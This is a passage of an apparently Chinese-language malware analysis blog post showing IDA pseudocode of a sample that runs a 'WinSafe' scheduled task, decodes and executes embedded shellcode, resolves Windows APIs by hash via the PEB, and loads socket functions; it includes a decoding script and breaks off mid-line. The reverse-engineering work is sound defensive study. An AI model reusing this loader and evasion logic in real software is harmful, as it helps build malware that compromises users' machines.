class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_4004B8</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> (__stdcall *pFnGetModuleFileNameA)(_DWORD, <span class="type">char</span> *, <span class="type">int</span>); <span class="comment">// edi</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> *i; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// al</span></span><br><span class="line">  _BYTE *j; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v9; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">13</span>]; <span class="comment">// [esp+0h] [ebp-130h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">19</span>]; <span class="comment">// [esp+Dh] [ebp-123h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [esp+20h] [ebp-110h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [esp+21h] [ebp-10Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  xor_6ah_400488(v11, sub_4009E0);              <span class="comment">// kernel32.dll</span></span><br><span class="line">  v0 = loadlibrary_400200(v11);                 <span class="comment">// 加载模块</span></span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v1 = v0;</span><br><span class="line">  xor_6ah_400488(v12, (_BYTE *)&amp;loc_400A49 + <span class="number">1</span>);<span class="comment">// GetModuleFileNameA</span></span><br><span class="line">  pFnGetModuleFileNameA = (<span class="type">int</span> (__stdcall *)(_DWORD, <span class="type">char</span> *, <span class="type">int</span>))getprocaddress_400271(v1, (<span class="type">int</span>)v12);<span class="comment">// 查找函数</span></span><br><span class="line">  v3 = &amp;v13;</span><br><span class="line">  sub_4007A2((<span class="type">int</span>)&amp;v13, <span class="number">0</span>, <span class="number">260</span>);                <span class="comment">// memset？</span></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( pFnGetModuleFileNameA &amp;&amp; pFnGetModuleFileNameA(<span class="number">0</span>, &amp;v13, <span class="number">260</span>) )<span class="comment">// 获取当前 exe 的路径，放到 v13</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = &amp;v14; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="type">unsigned</span> __int8)*(i - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v6 == <span class="string">&#x27;/&#x27;</span> || v6 == <span class="string">&#x27;\\&#x27;</span> )            <span class="comment">// 判断路径斜杠并更新 v3</span></span><br><span class="line">                                                <span class="comment">// 大概率是截取路径的最后一块</span></span><br><span class="line">      &#123;</span><br><span class="line">        v3 = i;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !*(i - <span class="number">1</span>) )                     <span class="comment">// 匹配到字符串末尾</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 = *v3;</span><br><span class="line">        <span class="keyword">if</span> ( *v3 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">for</span> ( j = v3 + <span class="number">3</span>; ; ++j )             <span class="comment">// 对路径进行处理（判断是否被重命名？）</span></span><br><span class="line">          &#123;</span><br><span class="line">            v9 = v7 &amp; <span class="number">0xDF</span> ^ <span class="number">0x49</span>;</span><br><span class="line">            v7 = *(j - <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !(v9 | v7 &amp; <span class="number">0xDF</span> ^ <span class="number">0x4E</span>) &amp;&amp; (*(j - <span class="number">1</span>) &amp; <span class="number">0xDF</span>) == <span class="string">&#x27;D&#x27;</span> &amp;&amp; (*j &amp; <span class="number">0xDF</span>) == <span class="string">&#x27;O&#x27;</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> ( !v7 )</span><br><span class="line">              <span class="keyword">return</span> v4;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="sub-400593-——计划任务执行"><a href="#sub-400593-——计划任务执行" class="headerlink" title="sub_400593()——计划任务执行"></a><code>sub_400593()</code>——计划任务执行</h3><p>这里伪代码，一开始都识别为 <code>MEMORY[0]</code>，没分析出来。<br>后面重新划分了一下前面 <code>sub_4002f5()</code> 的变量，可以正常得到函数调用结果。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400593</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> ProcessA_4009DC; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v2[<span class="number">4</span>]; <span class="comment">// [esp+28h] [ebp-98h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">50</span>]; <span class="comment">// [esp+3Ah] [ebp-86h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4[<span class="number">12</span>]; <span class="comment">// [esp+6Ch] [ebp-54h] BYREF</span></span><br><span class="line">  __int16 v5; <span class="comment">// [esp+9Ch] [ebp-24h]</span></span><br><span class="line"></span><br><span class="line">  xor_6ah_400488(v3, &amp;word_400A6E);             <span class="comment">// schtasks /run /tn WinSafe</span></span><br><span class="line">  sub_400783((<span class="type">int</span>)v4, <span class="number">0</span>, <span class="number">68</span>);                   <span class="comment">// memset？</span></span><br><span class="line">  sub_400783((<span class="type">int</span>)v2, <span class="number">0</span>, <span class="number">16</span>);                   <span class="comment">// 设置 PROCESS_INFORMATION？</span></span><br><span class="line">  v4[<span class="number">0</span>] = <span class="number">68</span>;                                   <span class="comment">// 设置 startupinfo？</span></span><br><span class="line">  v4[<span class="number">11</span>] = <span class="number">1</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  ProcessA_4009DC = pFnCreateProcessA_4009DC(<span class="number">0</span>, v3, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x8000000</span>, <span class="number">0</span>, <span class="number">0</span>, v4, v2);<span class="comment">// CreateProcessA</span></span><br><span class="line">                                                <span class="comment">// 尝试运行 / 创建计划任务</span></span><br><span class="line">  <span class="keyword">if</span> ( ProcessA_4009DC )                        <span class="comment">// 成功创建进程</span></span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="type">void</span> (__stdcall *)(<span class="type">int</span>))pFnCloseHandle)(v2[<span class="number">0</span>]);<span class="comment">// CloseHandle hProcess</span></span><br><span class="line">    ((<span class="type">void</span> (__stdcall *)(<span class="type">int</span>))pFnCloseHandle)(v2[<span class="number">1</span>]);<span class="comment">// CloseHandle hThread</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ProcessA_4009DC;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="sub-400660-——执行-shellcode"><a href="#sub-400660-——执行-shellcode" class="headerlink" title="sub_400660()——执行 shellcode"></a><code>sub_400660()</code>——执行 shellcode</h3><p>开辟了新的内存空间，把 shellcode 写入然后解码。<br>然后调用 <code>VirtualProtect()</code> 先把原来的 <code>RWX</code> 权限改为 <code>R-X</code>，然后再执行的，估计也是为了避免动态监测到权限全开的内存段。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_400660@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> space; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> (*v2)(<span class="type">void</span>); <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp-4h] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v7 = a1;</span><br><span class="line">  space = ((<span class="type">int</span> (__stdcall *)(_DWORD, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>))pFnVirtualAlloc)(<span class="number">0</span>, <span class="number">0x98B</span>, <span class="number">0x3000</span>, <span class="number">4</span>);<span class="comment">// VirtualAlloc(NULL, 0x98B, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)</span></span><br><span class="line">  <span class="keyword">if</span> ( !space )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v2 = (<span class="type">void</span> (*)(<span class="type">void</span>))space;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">0x98B</span>; ++i )                <span class="comment">// 复制</span></span><br><span class="line">    *((_BYTE *)v2 + i) = byte_400AA0[i];</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j != <span class="number">0x98B</span>; ++j )</span><br><span class="line">    *((_BYTE *)v2 + j) = (*((_BYTE *)v2 + j) + <span class="number">0x77</span>) ^ <span class="number">0x62</span>;<span class="comment">// 解码</span></span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="type">int</span> (__stdcall *)(<span class="type">void</span> (*)(<span class="type">void</span>), <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span> *))pFnVirtualProtect)(v2, <span class="number">0x98B</span>, <span class="number">0x20</span>, &amp;v7) )<span class="comment">// 修改内存空间为 PAGE_EXECUTE_READ</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2();                                       <span class="comment">// 执行 shellcode</span></span><br><span class="line">    v5 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pFnVirtualFree(v2, <span class="number">0</span>, <span class="number">0x8000</span>);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="shellcode-解码"><a href="#shellcode-解码" class="headerlink" title="shellcode 解码"></a>shellcode 解码</h3><h4 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN 0x98B</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span>  <span class="type">char</span> * buf = <span class="built_in">malloc</span>(<span class="number">0x990</span>);</span><br><span class="line">	FILE * fp = fopen(<span class="string">&quot;./shellcodes&quot;</span>, <span class="string">&quot;rb&quot;</span>), *fp_write;</span><br><span class="line">	fread(buf, <span class="number">1</span>, LEN, fp);</span><br><span class="line">	fclose(fp);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i != LEN; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		buf[i] = (buf[i] + <span class="number">0x77</span>) ^ <span class="number">0x62</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%#x &quot;</span>, buf[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	fp_write = fopen(<span class="string">&quot;./decoded&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">	fwrite(buf, <span class="number">1</span>, LEN, fp_write);</span><br><span class="line">	fclose(fp_write);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="sub-0"><a href="#sub-0" class="headerlink" title="sub_0()"></a><code>sub_0()</code></h4><p>ida 稍作函数编辑（汇编代码 <code>ALT + P</code>）即可分析出伪代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> **i; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 *v1; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> hKernel32; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> hNtdll; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">8</span>]; <span class="comment">// [esp+44h] [ebp-214h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">12</span>]; <span class="comment">// [esp+4Ch] [ebp-20Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> (__stdcall *pFnGetProcAddress)(<span class="type">int</span>, _BYTE *); <span class="comment">// [esp+58h] [ebp-200h]</span></span><br><span class="line">  <span class="type">int</span> (__stdcall *pFnLoadLibraryA)(<span class="type">char</span> *); <span class="comment">// [esp+5Ch] [ebp-1FCh]</span></span><br><span class="line">  <span class="type">int</span> (__stdcall *pFnVirtualAlloc)(_DWORD, _DWORD, <span class="type">int</span>, <span class="type">int</span>); <span class="comment">// [esp+60h] [ebp-1F8h]</span></span><br><span class="line">  <span class="type">int</span> pFnVirtualFree; <span class="comment">// [esp+64h] [ebp-1F4h]</span></span><br><span class="line">  <span class="type">int</span> pFnlstrcmpiA; <span class="comment">// [esp+68h] [ebp-1F0h]</span></span><br><span class="line">  <span class="type">void</span> (__stdcall *pFnRtlZeromemory)(<span class="type">int</span>, _DWORD); <span class="comment">// [esp+6Ch] [ebp-1ECh]</span></span><br><span class="line">  <span class="type">void</span> (__stdcall *pFnRtlMoveMemory)(<span class="type">int</span>, <span class="type">int</span>, _DWORD); <span class="comment">// [esp+70h] [ebp-1E8h]</span></span><br><span class="line">  <span class="type">int</span> (__stdcall *v20)(<span class="type">int</span>, <span class="type">char</span> *); <span class="comment">// [esp+74h] [ebp-1E4h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [esp+78h] [ebp-1E0h]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [esp+7Ch] [ebp-1DCh]</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// [esp+80h] [ebp-1D8h]</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// [esp+84h] [ebp-1D4h]</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// [esp+88h] [ebp-1D0h]</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// [esp+8Ch] [ebp-1CCh]</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// [esp+90h] [ebp-1C8h]</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// [esp+94h] [ebp-1C4h]</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// [esp+98h] [ebp-1C0h]</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// [esp+9Ch] [ebp-1BCh]</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [esp+B0h] [ebp-1A8h]</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// [esp+B4h] [ebp-1A4h]</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// [esp+B8h] [ebp-1A0h]</span></span><br><span class="line">  <span class="type">int</span> buf1; <span class="comment">// [esp+BCh] [ebp-19Ch]</span></span><br><span class="line">  <span class="type">int</span> buf2; <span class="comment">// [esp+C0h] [ebp-198h]</span></span><br><span class="line">  <span class="type">char</span> v36[<span class="number">400</span>]; <span class="comment">// [esp+C8h] [ebp-190h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v30 = <span class="number">0</span>;</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = *(<span class="type">int</span> ***)(*(_DWORD *)(__readfsdword(<span class="number">0x30</span>u) + <span class="number">0xC</span>) + <span class="number">0x14</span>); ; i = (<span class="type">int</span> **)*i )<span class="comment">// 从 fs 寄存器提取 peb 地址（fs:[0x30]），</span></span><br><span class="line">                                                <span class="comment">// 然后跳转到 ldr 链，读取 InMemoryOrderModuleList 链</span></span><br><span class="line">                                                <span class="comment">// 此时 i = 结构体成员 InMemoryOrderLinks 链地址</span></span><br><span class="line">                                                <span class="comment">// 开始遍历</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !i )</span><br><span class="line">    &#123;</span><br><span class="line">      hKernel32 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    &#125;</span><br><span class="line">    v1 = (<span class="type">unsigned</span> __int16 *)i[<span class="number">10</span>];             <span class="comment">// 0x8(InMemoryOrderModuleList 距离结构体起始位置)</span></span><br><span class="line">                                                <span class="comment">// +0x24(到 BaseDllName)</span></span><br><span class="line">                                                <span class="comment">// +0x4(到其中的 Buffer) BaseDllName-&gt;Buffer 地址</span></span><br><span class="line">                                                <span class="comment">// 于是这就是为什么偏移为 10（汇编显示 0x28）</span></span><br><span class="line">                                                <span class="comment">// https://www.vergiliusproject.com/kernels/x86/windows-10/22h2/_UNICODE_STRING</span></span><br><span class="line">    v2 = *((<span class="type">unsigned</span> __int16 *)i + <span class="number">18</span>) &gt;&gt; <span class="number">1</span>;    <span class="comment">// 除以 2？WCHAR？</span></span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; v2; --v2 )                     <span class="comment">// 计算哈希，匹配函数名</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = *v1++;                               <span class="comment">// 每次读取一个 unicode</span></span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= <span class="number">0x61</span> )</span><br><span class="line">        LOWORD(v4) = v4 - <span class="number">0x20</span>;</span><br><span class="line">      j = (<span class="type">unsigned</span> __int16)v4 + <span class="number">131</span> * j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (j &amp; <span class="number">0x7FFFFFFF</span>) == <span class="number">0x1CCA9CE6</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  hKernel32 = (<span class="type">int</span>)i[<span class="number">4</span>];                        <span class="comment">// DllBase dll 模块地址</span></span><br><span class="line">LABEL_10:</span><br><span class="line">  pFnGetProcAddress = (<span class="type">int</span> (__stdcall *)(<span class="type">int</span>, _BYTE *))sub_747(hKernel32, <span class="number">0x1AB9B854</span>, <span class="number">0</span>);<span class="comment">// GetProcAddress</span></span><br><span class="line">  pFnLoadLibraryA = (<span class="type">int</span> (__stdcall *)(<span class="type">char</span> *))sub_747(hKernel32, <span class="number">0x7F201F78</span>, pFnGetProcAddress);<span class="comment">// LoadLibraryA</span></span><br><span class="line">  pFnVirtualAlloc = (<span class="type">int</span> (__stdcall *)(_DWORD, _DWORD, <span class="type">int</span>, <span class="type">int</span>))sub_747(hKernel32, <span class="number">0x5E893462</span>, pFnGetProcAddress);<span class="comment">// VirtualAlloc</span></span><br><span class="line">  pFnVirtualFree = sub_747(hKernel32, <span class="number">0x6488073</span>, pFnGetProcAddress);<span class="comment">// VirtualFree</span></span><br><span class="line">  pFnlstrcmpiA = sub_747(hKernel32, <span class="number">0x705CF2A5</span>, pFnGetProcAddress);<span class="comment">// lstrcmpiA</span></span><br><span class="line">  <span class="built_in">strcpy</span>(v11, <span class="string">&quot;ntdll&quot;</span>);</span><br><span class="line">  hNtdll = pFnLoadLibraryA(v11);                <span class="comment">// 加载 ntdll</span></span><br><span class="line">  pFnRtlZeromemory = (<span class="type">void</span> (__stdcall *)(<span class="type">int</span>, _DWORD))sub_747(hNtdll, <span class="number">0xDB579CB</span>, pFnGetProcAddress);<span class="comment">// RtlZeroMemory</span></span><br><span class="line">  pFnRtlMoveMemory = (<span class="type">void</span> (__stdcall *)(<span class="type">int</span>, <span class="type">int</span>, _DWORD))sub_747(hNtdll, <span class="number">0x1518E9C0</span>, pFnGetProcAddress);<span class="comment">// RtlMoveMemory</span></span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *(_BYTE *)(v7 + <span class="number">276</span>) != <span class="string">&#x27;c&#x27;</span></span><br><span class="line">       || *(_BYTE *)(v7 + <span class="number">277</span>) != <span class="string">&#x27;o&#x27;</span></span><br><span class="line">       || *(_BYTE *)(v7 + <span class="number">278</span>) != <span class="string">&#x27;d&#x27;</span></span><br><span class="line">       || *(_BYTE *)(v7 + <span class="number">279</span>) != <span class="string">&#x27;e&#x27;</span></span><br><span class="line">       || *(_BYTE *)(v7 + <span class="number">280</span>) != <span class="string">&#x27;m&#x27;</span></span><br><span class="line">       || *(_BYTE *)(v7 + <span class="number">281</span>) != <span class="string">&#x27;a&#x27;</span></span><br><span class="line">       || *(_BYTE *)(v7 + <span class="number">282</span>) != <span class="string">&#x27;r&#x27;</span></span><br><span class="line">       || *(_BYTE *)(v7 + <span class="number">283</span>) != <span class="string">&#x27;k&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ++v7 &gt;= <span class="number">21000</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">  &#125;</span><br><span class="line">  v32 = v7 + <span class="number">276</span>;</span><br><span class="line">  buf1 = pFnVirtualAlloc(<span class="number">0</span>, *(_DWORD *)(v7 + <span class="number">308</span>), <span class="number">0x3000</span>, <span class="number">0x40</span>);<span class="comment">// MEM_COMMIT | MEM_RESERVE</span></span><br><span class="line">  pFnRtlZeromemory(buf1, *(_DWORD *)(v32 + <span class="number">32</span>));</span><br><span class="line">  pFnRtlMoveMemory(buf1, v32 + <span class="number">56</span>, *(_DWORD *)(v32 + <span class="number">32</span>));</span><br><span class="line">  buf2 = pFnVirtualAlloc(<span class="number">0</span>, *(_DWORD *)(v32 + <span class="number">44</span>), <span class="number">0x3000</span>, <span class="number">0x40</span>);<span class="comment">// PAGE_EXECUTE_READWRITE</span></span><br><span class="line">  pFnRtlZeromemory(buf2, *(_DWORD *)(v32 + <span class="number">44</span>));</span><br><span class="line">  pFnRtlMoveMemory(buf2, *(_DWORD *)(v32 + <span class="number">32</span>) + v32 + <span class="number">56</span>, *(_DWORD *)(v32 + <span class="number">44</span>));</span><br><span class="line">LABEL_23:</span><br><span class="line">  v8 = *(_DWORD *)(v32 + <span class="number">32</span>) + *(_DWORD *)(v32 + <span class="number">44</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v12, <span class="string">&quot;Ws2_32.dll&quot;</span>);</span><br><span class="line">  v33 = v32 + <span class="number">2</span> * v8 + <span class="number">56</span>;</span><br><span class="line">  v9 = pFnLoadLibraryA(v12);                    <span class="comment">// ws2_32.dll</span></span><br><span class="line">  v20 = (<span class="type">int</span> (__stdcall *)(<span class="type">int</span>, <span class="type">char</span> *))sub_747(v9, <span class="number">0x33522634</span>, pFnGetProcAddress);<span class="comment">// WSAStartup</span></span><br><span class="line">  v21 = sub_747(v9, <span class="number">0x26402D9F</span>, pFnGetProcAddress);<span class="comment">// socket</span></span><br><span class="line">  v22 = sub_747(v9, <span class="number">0x41539501</span>, pFnGetProcAddress);<span class="comment">// getaddrinfo</span></span><br><span class="line">  v23 = sub_747(v9, <span class="number">0x785E7DD7</span>, pFnGetProcAddress);<span class="comment">// freeaddrinfo</span></span><br><span class="line">  v24 = 